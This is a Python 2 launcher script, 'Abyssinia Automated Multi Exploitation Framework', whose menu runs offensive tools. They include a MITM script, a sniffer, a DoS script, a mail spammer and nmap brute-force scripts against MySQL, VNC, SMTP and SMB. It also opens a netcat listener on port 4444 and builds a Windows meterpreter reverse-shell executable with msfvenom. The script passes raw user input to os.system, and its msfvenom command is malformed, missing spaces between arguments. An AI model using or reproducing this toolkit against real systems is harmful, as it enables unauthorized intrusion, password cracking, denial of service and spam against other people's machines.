#!/usr/bin/env python
import threading
import os
import sys
def banner():
    print ""
    print "*************************************************"
    print ""
    print "Abyssinia Automated Multi Exploitation Framework"
    print "Ethiopian Cyber sword"
    print "Mati Ethiopia 2010"
    print ""
    print "  ___  _                   _       _       "
    print " / _ \| |                 (_)     (_)      "
    print "/ /_\ \ |__  _   _ ___ ___ _ _ __  _  __ _ "
    print "|  _  | '_ \| | | / __/ __| | '_ \| |/ _` |"
    print "| | | | |_) | |_| \__ \__ \ | | | | | (_| |"
    print "\_| |_/_.__/ \__, |___/___/_|_| |_|_|\__,_|"
    print "              __/ |                        "
    print "             |___/                         \n"
    print "*************************************************"
    print ""
def menu():
    print "[1]Abyssinia URL MITM"
    print "[2]Abyssinia Sniffer"
    print "[3]Abyssinia DOS"
    print "[4]Abyssinia Firewall Bypass"
    print "[5]Abyssinia Mail Spammer"
    print "[6]Abyssinia MySQL Server Users Scan"
    print "[7]Abyssinia Brute Force Passwords MySQL"
    print "[8]Abyssinia Brute Force against VNC Servers"
    print "[9]Abyssinia Brute Force against SMTP Servers"
    print "[10]Abyssinia Brute-Force Windows Account Passwords"
    print "[11]Abyssinia Windows Metasploit Payload"
def main():
    try:
        print ""
        choice = input('Enter your choice:')
        if choice == 1:
            os.system('python mitm_url.py')
            menu()
            main()
        if choice == 2:
            os.system('chmod +x sniffer')
            os.system('./sniffer')
            menu()
            main()
        if choice == 3:
            os.system('python dos.py')
            menu()
            main()
        if choice == 4:
            print "Abyssinia Firewall Bypass"
            os.system('nc -l -v -p 4444')
            menu()
            main()
        if choice == 5:
            os.system('python mailspam.py')
            menu()
            main()
        if choice == 6:
            mysqlIP = raw_input('MySQL Server IP: ')
            os.system("nmap -sV --script mysql-users \t" + mysqlIP)
            menu()
            main()
        if choice == 7:
            mysqlIP2 = raw_input('MySQL Server IP: ')
            os.system("nmap --script=mysql-brute \t" + mysqlIP2)
            menu()
            main()
        if choice == 8:
            vncIP = raw_input('VNC Server IP: ')
            os.system("nmap --script vnc-brute -p 5900 \t" + vncIP)
            menu()
            main()
        if choice == 9:
            serverIP = raw_input('Server IP: ')
            os.system("nmap -p 25 --script smtp-brute \t" + serverIP)
            menu()
            main()
        if choice == 10:
            windowsIP = raw_input('Windows IP: ')
            os.system("nmap -p 445 --script=smb-brute.nse,smb-enum-shares\t" + windowsIP+"/24")
            menu()
            main()
        if choice == 11:
            lhost = raw_input('Local IP: ')
            lport = raw_input('Local Port: ')
            os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + lhost +"LPORT=" + lport +"-f exe > /root/Desktop/shell.exe")
            menu()
            main()
        else:
            print "Invalid option!"
            menu()
            main()
    except:
        print "Something went wrong!"
        menu()
        main()
banner()
menu()
main()
